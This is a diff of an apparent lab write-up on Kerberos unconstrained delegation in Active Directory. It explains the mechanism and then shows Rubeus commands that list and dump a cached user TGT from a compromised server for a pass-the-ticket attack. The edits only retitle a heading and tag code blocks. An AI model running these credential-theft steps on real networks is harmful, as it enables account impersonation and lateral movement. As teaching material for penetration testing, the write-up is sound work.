@@ -8,7 +8,7 @@ toc: true
 toc_number: false
 ---
 
-# Overview
+# Unconstrained Delegation
 ![Unconstrained Delegation](https://i.postimg.cc/h4XfzHtT/Unconstrained-drawio.png)
 
 When a user wants to access a service eg: **HTTP** the client will ask for **Service Ticket** for HTTP service from the Ticket Granting Server by providing their TGT and SPN `HTTP\dev.dhitalcorp.local`, the Ticket Granting Server will verify the TGT provide them **ST** for that service, the client will then present the ST to the web server which will grant or deny them access. But in a dynamic web application the web application will have to  only display the information and functionalities this user is supposed to access as opposed to an administrator user right? Due to this issue Microsoft introduced unconstrained delegation. When the user sends **ST** to the web server computer, the web server computer will extract the user's **TGT** from the Service Ticket and cache it in its memory then it will send the user's TGT to the domain controller on behalf of this user to request service ticket for database server. After receiving the **ST** for database server it will connect to the database server on behalf of this user and complete the user impersonation to display only the information and functionalities which the client has access to or perform action on the web application as that user. 
@@ -29,7 +29,7 @@ OperatingSystem    : Windows Server 2016 Standard
 Unconstrained      : True
 ```
 After compromising `APP01$` computer we can use Rubeus or mimikatz for exporting the user's TGT who connected to this computer. Below we are using Rubeus.
-```
+```powershell
 C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 -------------------------------------------------------------------------------------------------------------------- 
  | LUID     | UserName                  | Service                                       | EndTime                  |
@@ -41,7 +41,7 @@ C:\Users\Alex> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 ```
 We can see jdoe's TGT is cached. We can simply extract his TGT and leverage it using pass the ticket attack.
 
-```
+```powershell
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b5d2 /nowrap
 
 woIGwkMuSU92GH23KL....==
